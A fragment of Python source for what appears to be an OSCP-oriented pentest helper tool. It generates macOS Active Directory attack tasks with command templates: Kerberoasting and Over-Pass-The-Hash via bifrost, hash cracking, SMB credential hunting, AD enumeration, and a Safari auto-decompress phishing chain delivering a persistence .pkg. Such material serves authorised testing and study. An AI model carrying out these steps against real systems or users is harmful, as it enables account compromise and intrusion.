                    'Mount shares: mount -t smbfs //server/share /mnt',
                    'Request service tickets for specific services'
                ],
                'alternatives': [
                    'bifrost --action asktgt --keytab /path/to/keytab',
                    'Use AES hash: --hash AESHASH --enctype aes256',
                    'Rubeus on Windows (if pivoting)',
                    'Impacket getTGT.py (from attacker machine)'
                ],
                'notes': 'Over-Pass-The-Hash converts hash to Kerberos TGT. Works with NTLM (RC4) or AES hashes. TGT can be used for Pass-the-Ticket to access network resources.'
            }
        })

        # Task: Kerberoasting (macOS)
        ad_attacks['children'].append({
            'id': f'macos-kerberoast-{port}',
            'name': 'Kerberoasting Attack',
            'type': 'command',
            'metadata': {
                'command': 'bifrost --action asktgs --spn MSSQLSvc/server.domain.com:1433 --domain DOMAIN.COM --username USER --hash NTHASH --enctype rc4',
                'description': 'Request service ticket for crackable hash (Kerberoasting)',
                'flag_explanations': {
                    '--action asktgs': 'Request Ticket Granting Service (service ticket)',
                    '--spn': 'Service Principal Name (e.g., MSSQLSvc/server:1433)',
                    '--enctype rc4': 'Request RC4 encryption (weaker, easier to crack)'
                },
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'AD', 'KERBEROS', 'MACOS'],
                'success_indicators': [
                    'Service ticket obtained',
                    'Ticket saved for offline cracking',
                    'TGS encrypted with service account password'
                ],
                'failure_indicators': [
                    'SPN not found',
                    'Service account not Kerberoastable',
                    'Encryption type not RC4'
                ],
                'next_steps': [
                    'Extract ticket for cracking: klist',
                    'Crack with Hashcat: hashcat -m 13100',
                    'Crack with John: john --format=krb5tgs',
                    'Enumerate more SPNs for additional service accounts'
                ],
                'alternatives': [
                    'GetUserSPNs.py from Impacket (attacker box)',
                    'Rubeus kerberoast (Windows)',
                    'MacHound to identify kerberoastable accounts',
                    'Manual LDAP query for servicePrincipalName attribute'
                ],
                'notes': 'Target service accounts with RC4 encryption. Common SPNs: MSSQLSvc, HTTP, CIFS, HOST. Service ticket encrypted with service account password hash - offline crackable.'
            }
        })

        # Task: SMB Access from macOS
        ad_attacks['children'].append({
            'id': f'macos-smb-access-{port}',
            'name': 'Access SMB Shares (Post-Kerberos)',
            'type': 'command',
            'metadata': {
                'command': 'smbutil view //server.domain.local',
                'description': 'List SMB shares using Kerberos authentication',
                'flag_explanations': {
                    'smbutil': 'macOS SMB utility',
                    'view': 'List available shares',
                    '//server.domain.local': 'Target server FQDN'
                },
                'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT', 'AD', 'MACOS'],
                'success_indicators': [
                    'Shares listed (C$, ADMIN$, SYSVOL, etc.)',
                    'Authentication successful',
                    'Access granted to shares'
                ],
                'failure_indicators': [
                    'Access denied',
                    'Kerberos ticket expired',
                    'Server unreachable'
                ],
                'next_steps': [
                    'Mount share: mount -t smbfs //server/share /mnt/point',
                    'Browse files: ls /mnt/point',
                    'Search for sensitive data',
                    'Look for scripts, configs, credentials'
                ],
                'alternatives': [
                    'smbclient //server/share (Samba)',
                    'mount_smbfs //user@server/share /mnt/point',
                    'Finder: Cmd+K â†’ smb://server/share',
                    'crackmapexec smb server --shares (from attacker box)'
                ],
                'notes': 'Use Kerberos tickets from Over-Pass-The-Hash or legitimate auth. macOS natively supports SMB with Kerberos SSO.'
            }
        })

        tasks['children'].append(ad_attacks)

        # === PHASE 5: macOS-Specific Tools & Techniques ===
        macos_tools = {
            'id': f'macos-tools-{port}',
            'name': 'macOS Red Team Tools',
            'type': 'parent',
            'children': []
        }

        # Task: MacHound (BloodHound for macOS)
        macos_tools['children'].append({
            'id': f'macos-machound-{port}',
            'name': 'MacHound AD Enumeration',
            'type': 'command',
            'metadata': {
                'command': 'python3 macHound.py -u USER -p PASSWORD -d DOMAIN -c All',
                'description': 'Enumerate AD relationships on macOS for BloodHound analysis',
                'flag_explanations': {
                    'macHound.py': 'macOS AD enumeration for BloodHound',
                    '-u USER': 'Domain username',
                    '-p PASSWORD': 'User password',
                    '-d DOMAIN': 'Active Directory domain',
                    '-c All': 'Collection method (All, Sessions, LocalAdmin, etc.)'
                },
                'tags': ['OSCP:MEDIUM', 'ENUM', 'AD', 'AUTOMATED', 'MACOS'],
                'success_indicators': [
                    'JSON files generated for BloodHound',
                    'Relationships discovered: CanSSH, CanVNC, CanAE',
                    'AD objects enumerated'
                ],
                'failure_indicators': [
                    'Authentication failed',
                    'Domain unreachable',
                    'Insufficient permissions'
                ],
                'next_steps': [
                    'Import JSON into BloodHound GUI',
                    'Analyze attack paths to Domain Admins',
                    'Identify CanSSH/CanVNC relationships',
                    'Look for CanAE (AppleEvent) access'
                ],
                'alternatives': [
                    'BloodHound Python (from attacker box)',
                    'SharpHound (Windows)',
                    'Manual dscl enumeration',
                    'Install: git clone https://github.com/XMCyber/MacHound'
                ],
                'notes': 'MacHound adds 3 macOS-specific edges to BloodHound: CanSSH (SSH access), CanVNC (VNC access), CanAE (AppleEvent script execution).'
            }
        })

        # Task: Bifrost Kerberos Tool
        macos_tools['children'].append({
            'id': f'macos-bifrost-{port}',
            'name': 'Bifrost Kerberos Attacks',
            'type': 'manual',
            'metadata': {
                'description': 'Bifrost: Objective-C Kerberos attack tool for macOS (Heimdal krb5 APIs)',
                'notes': '''Bifrost Capabilities:
1. askhash: Extract password hashes from keychain
2. asktgt: Request TGT (Over-Pass-The-Hash)
3. asktgs: Request service tickets (Kerberoasting)
4. Ticket injection into session
5. Heimdal-specific Kerberos operations

Installation:
git clone https://github.com/its-a-feature/bifrost
cd bifrost
make

Common Commands:
# Get computer account hash
bifrost --action askhash --username COMPUTER$ --domain domain.com

# Over-Pass-The-Hash
bifrost --action asktgt --username user --hash HASH --enctype aes256 --domain domain.com

# Kerberoasting
bifrost --action asktgs --spn SERVICE/host --domain domain.com --username user --hash HASH

Advantages:
- Native macOS Kerberos (Heimdal)
- No Python dependencies
- Direct API access
- Supports AES256/RC4 encryption''',
                'tags': ['OSCP:MEDIUM', 'TOOL', 'KERBEROS', 'MACOS'],
                'next_steps': [
                    'Compile Bifrost from source',
                    'Extract computer account hash',
                    'Perform Over-Pass-The-Hash',
                    'Kerberoast service accounts'
                ],
                'alternatives': [
                    'Impacket tools (from attacker machine)',
                    'Rubeus (Windows)',
                    'Manual Kerberos with kinit/klist'
                ]
            }
        })

        # Task: Orchard JXA Enumeration
        macos_tools['children'].append({
            'id': f'macos-orchard-{port}',
            'name': 'Orchard JXA AD Enumeration',
            'type': 'command',
            'metadata': {
                'command': 'osascript -l JavaScript orchard.js',
                'description': 'JavaScript for Automation (JXA) Active Directory enumeration',
                'flag_explanations': {
                    'osascript': 'macOS script execution engine',
                    '-l JavaScript': 'Use JavaScript language (JXA)',
                    'orchard.js': 'AD enumeration script'
                },
                'tags': ['OSCP:MEDIUM', 'ENUM', 'AD', 'STEALTH', 'MACOS'],
                'success_indicators': [
                    'AD objects enumerated',
                    'Users, groups, computers discovered',
                    'No external tools needed (built-in JXA)'
                ],
                'failure_indicators': [
                    'Not domain-joined',
                    'Script error',
                    'Permission denied'
                ],
                'next_steps': [
                    'Parse enumeration results',
                    'Identify high-value targets',
                    'Map AD infrastructure',
                    'Combine with MacHound for BloodHound import'
                ],
                'alternatives': [
                    'dscl command-line enumeration',
                    'MacHound (more comprehensive)',
                    'ldapsearch to DC',
                    'Install: git clone https://github.com/its-a-feature/Orchard'
                ],
                'notes': 'JXA = JavaScript for Automation. Uses native macOS APIs, no external tools. Stealthy enumeration method.'
            }
        })

        # Task: Safari Auto-Decompress Attack
        macos_tools['children'].append({
            'id': f'macos-safari-zip-{port}',
            'name': 'Safari Auto-Decompress Exploit',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit Safari "safe files" auto-decompression for payload delivery',
                'notes': '''Safari Auto-Decompress Attack:

Default Behavior:
- Safari considers certain files "safe"
- Safe files automatically opened after download
- .zip archives automatically decompressed

Attack Vector:
1. Create malicious payload (pkg, app, script)
2. Compress as .zip archive
3. Host on web server
4. Victim downloads via Safari
5. Safari auto-decompresses
6. Payload exposed (may auto-execute)

Safe File Types:
- .zip, .tar, .gz (archives)
- .dmg (disk images)
- .pkg (installer packages)
- .mpkg (meta-packages)

Exploitation:
- Zip containing malicious .pkg â†’ Auto-decompressed
- .pkg with install scripts â†’ May prompt or auto-run
- .app bundles â†’ May execute if user clicks

Mitigation:
Safari Preferences â†’ General â†’ Uncheck "Open safe files after downloading"

OSCP Relevance: Low (social engineering required)
Red Team Value: Medium (useful for macOS phishing)''',
                'tags': ['OSCP:LOW', 'SOCIAL_ENGINEERING', 'DELIVERY', 'MACOS'],
                'next_steps': [
                    'Create malicious .pkg with pkgbuild',
                    'Add install script for persistence',
                    'Compress as .zip',
                    'Host on phishing domain',
                    'Deliver link to target'
                ],
                'alternatives': [
                    'Traditional phishing with .dmg',
                    'Office macro on macOS (limited)',
                    'PDF exploit delivery',
                    'Watering hole attack'
                ]
            }
        })

        tasks['children'].append(macos_tools)

        # === PHASE 6: Exploitation & Post-Exploit ===
        if version:
            exploit_research = {
                'id': f'macos-exploit-research-{port}',
                'name': f'Exploit Research: {product} {version}',
                'type': 'parent',
                'children': []
            }

            # SearchSploit
            exploit_research['children'].append({
                'id': f'macos-searchsploit-{port}',
                'name': f'SearchSploit: {product} {version}',
                'type': 'command',
                'metadata': {
                    'command': f'searchsploit "{product} {version}"',
                    'description': 'Search exploit-db for known macOS exploits',
                    'tags': ['OSCP:HIGH', 'RESEARCH'],
                    'success_indicators': [
                        'Exploits found',
                        'CVE references displayed',
                        'Local/remote exploits listed'
                    ],
                    'failure_indicators': [
                        'No results',
                        'Version too new',
                        'Database outdated'
                    ],
                    'next_steps': [
                        'Copy exploit: searchsploit -m [EDB-ID]',
                        'Read exploit code',
                        'Check CVE details',
                        'Test in lab environment'
                    ],
                    'alternatives': [
                        'Google: "macOS [version] exploit"',
                        'GitHub security advisories',
                        'CVE database search',
                        'Metasploit search: search type:exploit platform:osx'
                    ]
                }
            })

            # CVE Lookup
            exploit_research['children'].append({
                'id': f'macos-cve-{port}',
                'name': f'CVE Lookup: macOS {version}',
                'type': 'research',
                'metadata': {
                    'description': f'Research CVEs for macOS {version}',
                    'notes': f'Search: NVD (nvd.nist.gov), CVE Details, macOS security updates',
                    'tags': ['OSCP:HIGH', 'RESEARCH'],
                    'next_steps': [
                        'Check macOS security update history',
                        'Look for privilege escalation CVEs',
                        'Research sandbox escapes',
                        'Find kernel exploits'
                    ],
                    'alternatives': [
                        'searchsploit macos',
                        'Google: site:cve.mitre.org macOS',
                        'GitHub: "macOS exploit"'
                    ]
                }
            })

            tasks['children'].append(exploit_research)

        return tasks
